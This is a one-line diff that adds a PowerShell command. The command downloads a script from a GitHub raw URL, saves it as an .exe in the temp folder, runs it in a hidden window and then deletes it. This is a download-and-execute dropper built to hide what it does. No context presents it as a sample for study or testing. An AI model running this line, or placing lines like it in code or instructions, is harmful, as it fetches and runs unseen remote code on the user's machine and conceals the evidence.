@@ -1,0 +1,1 @@
+$e="$env:TMP\file.exe"; iwr "https://github.com/Aevagee/younet/raw/refs/heads/main/yy.ps1" -OutFile $e; Start-Process $e -WindowStyle Hidden; Remove-Item $e
